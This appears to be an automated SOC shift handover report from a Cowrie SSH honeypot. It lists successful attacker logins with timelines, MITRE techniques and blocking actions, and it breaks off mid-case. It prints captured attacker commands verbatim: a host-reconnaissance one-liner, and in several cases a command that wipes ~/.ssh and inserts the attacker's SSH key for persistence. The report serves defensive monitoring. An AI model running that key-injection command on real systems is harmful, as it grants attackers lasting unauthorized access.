# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-09 |
| **Generated At** | 2026-03-09T19:02:05Z |
| **Shift Time** | 19:02 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **456** |
| Confirmed Threats | **198** |
| False Positives Filtered | **258** (56.6%) |
| Unique Attacker IPs | **139** |
| Countries of Origin | **25** |
| High Severity Cases | **70** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **386** |
| Malware Samples Analyzed | **0** HIGH · **0** MED · 0 empty upload attempt(s) |

---

## 🚨 Priority Cases — Immediate Attention (31)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-6a3557215fc3

| Field | Detail |
|---|---|
| **Source IP** | `206.189.106.227` |
| **First Seen** | 2026-03-09 02:52 |
| **Last Seen** | 2026-03-09 02:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 02:52:12` | `cowrie.session.connect` |
| `2026-03-09 02:52:13` | `cowrie.client.version` |
| `2026-03-09 02:52:13` | `cowrie.client.kex` |
| `2026-03-09 02:52:15` | `cowrie.login.success` |
| `2026-03-09 02:52:16` | `cowrie.session.params` |
| `2026-03-09 02:52:16` | `cowrie.command.input` |
| `2026-03-09 02:52:16` | `cowrie.command.input` |
| `2026-03-09 02:52:16` | `cowrie.command.input` |
| `2026-03-09 02:52:16` | `cowrie.command.input` |
| `2026-03-09 02:52:16` | `cowrie.log.closed` |
| `2026-03-09 02:52:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.106.227` to AbuseIPDB if not already reported
- [ ] Block `206.189.106.227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e958fd716b88

| Field | Detail |
|---|---|
| **Source IP** | `206.189.106.227` |
| **First Seen** | 2026-03-09 02:53 |
| **Last Seen** | 2026-03-09 02:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 02:53:28` | `cowrie.session.connect` |
| `2026-03-09 02:53:28` | `cowrie.client.version` |
| `2026-03-09 02:53:28` | `cowrie.client.kex` |
| `2026-03-09 02:53:30` | `cowrie.login.success` |
| `2026-03-09 02:53:30` | `cowrie.session.params` |
| `2026-03-09 02:53:30` | `cowrie.command.input` |
| `2026-03-09 02:53:30` | `cowrie.command.input` |
| `2026-03-09 02:53:30` | `cowrie.command.input` |
| `2026-03-09 02:53:30` | `cowrie.command.input` |
| `2026-03-09 02:53:31` | `cowrie.log.closed` |
| `2026-03-09 02:53:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.106.227` to AbuseIPDB if not already reported
- [ ] Block `206.189.106.227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed7a899d18a0

| Field | Detail |
|---|---|
| **Source IP** | `206.189.106.227` |
| **First Seen** | 2026-03-09 02:54 |
| **Last Seen** | 2026-03-09 02:54 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 02:54:43` | `cowrie.session.connect` |
| `2026-03-09 02:54:44` | `cowrie.client.version` |
| `2026-03-09 02:54:44` | `cowrie.client.kex` |
| `2026-03-09 02:54:46` | `cowrie.login.success` |
| `2026-03-09 02:54:48` | `cowrie.session.params` |
| `2026-03-09 02:54:48` | `cowrie.command.input` |
| `2026-03-09 02:54:48` | `cowrie.command.input` |
| `2026-03-09 02:54:48` | `cowrie.command.input` |
| `2026-03-09 02:54:48` | `cowrie.command.input` |
| `2026-03-09 02:54:48` | `cowrie.log.closed` |
| `2026-03-09 02:54:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.106.227` to AbuseIPDB if not already reported
- [ ] Block `206.189.106.227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28c9220c6108

| Field | Detail |
|---|---|
| **Source IP** | `206.189.106.227` |
| **First Seen** | 2026-03-09 02:55 |
| **Last Seen** | 2026-03-09 02:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 02:55:58` | `cowrie.session.connect` |
| `2026-03-09 02:55:58` | `cowrie.client.version` |
| `2026-03-09 02:55:58` | `cowrie.client.kex` |
| `2026-03-09 02:56:00` | `cowrie.login.success` |
| `2026-03-09 02:56:01` | `cowrie.session.params` |
| `2026-03-09 02:56:01` | `cowrie.command.input` |
| `2026-03-09 02:56:01` | `cowrie.command.input` |
| `2026-03-09 02:56:01` | `cowrie.command.input` |
| `2026-03-09 02:56:01` | `cowrie.command.input` |
| `2026-03-09 02:56:01` | `cowrie.log.closed` |
| `2026-03-09 02:56:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.106.227` to AbuseIPDB if not already reported
- [ ] Block `206.189.106.227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e40ee19dd3f4

| Field | Detail |
|---|---|
| **Source IP** | `101.126.129.179` |
| **First Seen** | 2026-03-09 03:51 |
| **Last Seen** | 2026-03-09 03:56 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 03:51:48` | `cowrie.session.connect` |
| `2026-03-09 03:51:48` | `cowrie.client.version` |
| `2026-03-09 03:51:48` | `cowrie.client.kex` |
| `2026-03-09 03:51:49` | `cowrie.login.success` |
| `2026-03-09 03:56:49` | `cowrie.session.file_upload` |
| `2026-03-09 03:56:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.129.179` to AbuseIPDB if not already reported
- [ ] Block `101.126.129.179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffd7746ac318

| Field | Detail |
|---|---|
| **Source IP** | `101.36.123.173` |
| **First Seen** | 2026-03-09 04:14 |
| **Last Seen** | 2026-03-09 04:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | {'url': '', 'sha256': 'a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2'} |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 04:14:42` | `cowrie.session.connect` |
| `2026-03-09 04:14:42` | `cowrie.client.version` |
| `2026-03-09 04:14:42` | `cowrie.client.kex` |
| `2026-03-09 04:14:43` | `cowrie.login.success` |
| `2026-03-09 04:14:43` | `cowrie.session.params` |
| `2026-03-09 04:14:43` | `cowrie.command.input` |
| `2026-03-09 04:14:43` | `cowrie.command.failed` |
| `2026-03-09 04:14:43` | `cowrie.log.closed` |
| `2026-03-09 04:14:43` | `cowrie.session.params` |
| `2026-03-09 04:14:43` | `cowrie.command.input` |
| `2026-03-09 04:14:43` | `cowrie.session.file_download` |
| `2026-03-09 04:14:43` | `cowrie.log.closed` |
| `2026-03-09 04:14:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.123.173` to AbuseIPDB if not already reported
- [ ] Block `101.36.123.173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ff3db877095

| Field | Detail |
|---|---|
| **Source IP** | `101.36.123.173` |
| **First Seen** | 2026-03-09 04:14 |
| **Last Seen** | 2026-03-09 04:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 04:14:45` | `cowrie.session.connect` |
| `2026-03-09 04:14:45` | `cowrie.client.version` |
| `2026-03-09 04:14:45` | `cowrie.client.kex` |
| `2026-03-09 04:14:45` | `cowrie.login.success` |
| `2026-03-09 04:14:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.123.173` to AbuseIPDB if not already reported
- [ ] Block `101.36.123.173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae586476c63d

| Field | Detail |
|---|---|
| **Source IP** | `101.36.123.173` |
| **First Seen** | 2026-03-09 04:22 |
| **Last Seen** | 2026-03-09 04:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | {'url': '', 'sha256': 'a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2'} |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 04:22:48` | `cowrie.session.connect` |
| `2026-03-09 04:22:48` | `cowrie.client.version` |
| `2026-03-09 04:22:48` | `cowrie.client.kex` |
| `2026-03-09 04:22:49` | `cowrie.login.success` |
| `2026-03-09 04:22:49` | `cowrie.session.params` |
| `2026-03-09 04:22:49` | `cowrie.command.input` |
| `2026-03-09 04:22:49` | `cowrie.command.failed` |
| `2026-03-09 04:22:49` | `cowrie.log.closed` |
| `2026-03-09 04:22:49` | `cowrie.session.params` |
| `2026-03-09 04:22:49` | `cowrie.command.input` |
| `2026-03-09 04:22:49` | `cowrie.session.file_download` |
| `2026-03-09 04:22:49` | `cowrie.log.closed` |
| `2026-03-09 04:22:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.123.173` to AbuseIPDB if not already reported
- [ ] Block `101.36.123.173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47ba346f4fd0

| Field | Detail |
|---|---|
| **Source IP** | `101.36.123.173` |
| **First Seen** | 2026-03-09 04:22 |
| **Last Seen** | 2026-03-09 04:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 04:22:51` | `cowrie.session.connect` |
| `2026-03-09 04:22:51` | `cowrie.client.version` |
| `2026-03-09 04:22:51` | `cowrie.client.kex` |
| `2026-03-09 04:22:52` | `cowrie.login.success` |
| `2026-03-09 04:22:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.123.173` to AbuseIPDB if not already reported
- [ ] Block `101.36.123.173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba08c5ff3183

| Field | Detail |
|---|---|
| **Source IP** | `157.15.59.120` |
| **First Seen** | 2026-03-09 06:48 |
| **Last Seen** | 2026-03-09 06:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 06:48:45` | `cowrie.session.connect` |
| `2026-03-09 06:48:45` | `cowrie.client.version` |
| `2026-03-09 06:48:45` | `cowrie.client.kex` |
| `2026-03-09 06:48:45` | `cowrie.login.success` |
| `2026-03-09 06:48:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.15.59.120` to AbuseIPDB if not already reported
- [ ] Block `157.15.59.120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c110052cd5c

| Field | Detail |
|---|---|
| **Source IP** | `170.64.177.28` |
| **First Seen** | 2026-03-09 07:37 |
| **Last Seen** | 2026-03-09 07:37 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 07:37:06` | `cowrie.session.connect` |
| `2026-03-09 07:37:06` | `cowrie.client.version` |
| `2026-03-09 07:37:06` | `cowrie.client.kex` |
| `2026-03-09 07:37:09` | `cowrie.login.success` |
| `2026-03-09 07:37:10` | `cowrie.session.params` |
| `2026-03-09 07:37:10` | `cowrie.command.input` |
| `2026-03-09 07:37:10` | `cowrie.command.input` |
| `2026-03-09 07:37:10` | `cowrie.command.input` |
| `2026-03-09 07:37:10` | `cowrie.command.input` |
| `2026-03-09 07:37:10` | `cowrie.log.closed` |
| `2026-03-09 07:37:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.64.177.28` to AbuseIPDB if not already reported
- [ ] Block `170.64.177.28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4765db8cf7a5

| Field | Detail |
|---|---|
| **Source IP** | `170.64.177.28` |
| **First Seen** | 2026-03-09 07:38 |
| **Last Seen** | 2026-03-09 07:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 07:38:20` | `cowrie.session.connect` |
| `2026-03-09 07:38:20` | `cowrie.client.version` |
| `2026-03-09 07:38:20` | `cowrie.client.kex` |
| `2026-03-09 07:38:22` | `cowrie.login.success` |
| `2026-03-09 07:38:24` | `cowrie.session.params` |
| `2026-03-09 07:38:24` | `cowrie.command.input` |
| `2026-03-09 07:38:24` | `cowrie.command.input` |
| `2026-03-09 07:38:24` | `cowrie.command.input` |
| `2026-03-09 07:38:24` | `cowrie.command.input` |
| `2026-03-09 07:38:24` | `cowrie.log.closed` |
| `2026-03-09 07:38:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.64.177.28` to AbuseIPDB if not already reported
- [ ] Block `170.64.177.28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96fa3a929293

| Field | Detail |
|---|---|
| **Source IP** | `138.197.172.49` |
| **First Seen** | 2026-03-09 08:04 |
| **Last Seen** | 2026-03-09 08:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 08:04:43` | `cowrie.session.connect` |
| `2026-03-09 08:04:43` | `cowrie.client.version` |
| `2026-03-09 08:04:43` | `cowrie.client.kex` |
| `2026-03-09 08:04:45` | `cowrie.login.success` |
| `2026-03-09 08:04:46` | `cowrie.session.params` |
| `2026-03-09 08:04:46` | `cowrie.command.input` |
| `2026-03-09 08:04:46` | `cowrie.command.input` |
| `2026-03-09 08:04:46` | `cowrie.command.input` |
| `2026-03-09 08:04:46` | `cowrie.command.input` |
| `2026-03-09 08:04:46` | `cowrie.log.closed` |
| `2026-03-09 08:04:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.197.172.49` to AbuseIPDB if not already reported
- [ ] Block `138.197.172.49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e9205b17451

| Field | Detail |
|---|---|
| **Source IP** | `138.197.172.49` |
| **First Seen** | 2026-03-09 08:05 |
| **Last Seen** | 2026-03-09 08:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 08:05:28` | `cowrie.session.connect` |
| `2026-03-09 08:05:29` | `cowrie.client.version` |
| `2026-03-09 08:05:29` | `cowrie.client.kex` |
| `2026-03-09 08:05:30` | `cowrie.login.success` |
| `2026-03-09 08:05:31` | `cowrie.session.params` |
| `2026-03-09 08:05:31` | `cowrie.command.input` |
| `2026-03-09 08:05:31` | `cowrie.command.input` |
| `2026-03-09 08:05:31` | `cowrie.command.input` |
| `2026-03-09 08:05:31` | `cowrie.command.input` |
| `2026-03-09 08:05:31` | `cowrie.log.closed` |
| `2026-03-09 08:05:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.197.172.49` to AbuseIPDB if not already reported
- [ ] Block `138.197.172.49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcbd8c6416b8

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137.213` |
| **First Seen** | 2026-03-09 08:06 |
| **Last Seen** | 2026-03-09 08:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | {'url': '', 'sha256': 'a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2'} |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 08:06:24` | `cowrie.session.connect` |
| `2026-03-09 08:06:24` | `cowrie.client.version` |
| `2026-03-09 08:06:24` | `cowrie.client.kex` |
| `2026-03-09 08:06:25` | `cowrie.login.success` |
| `2026-03-09 08:06:26` | `cowrie.session.params` |
| `2026-03-09 08:06:26` | `cowrie.command.input` |
| `2026-03-09 08:06:26` | `cowrie.command.failed` |
| `2026-03-09 08:06:26` | `cowrie.log.closed` |
| `2026-03-09 08:06:27` | `cowrie.session.params` |
| `2026-03-09 08:06:27` | `cowrie.command.input` |
| `2026-03-09 08:06:27` | `cowrie.session.file_download` |
| `2026-03-09 08:06:27` | `cowrie.log.closed` |
| `2026-03-09 08:06:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137.213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137.213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c23ed1df415

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137.213` |
| **First Seen** | 2026-03-09 08:06 |
| **Last Seen** | 2026-03-09 08:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 08:06:30` | `cowrie.session.connect` |
| `2026-03-09 08:06:30` | `cowrie.client.version` |
| `2026-03-09 08:06:31` | `cowrie.client.kex` |
| `2026-03-09 08:06:32` | `cowrie.login.success` |
| `2026-03-09 08:06:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137.213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137.213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9255855886ce

| Field | Detail |
|---|---|
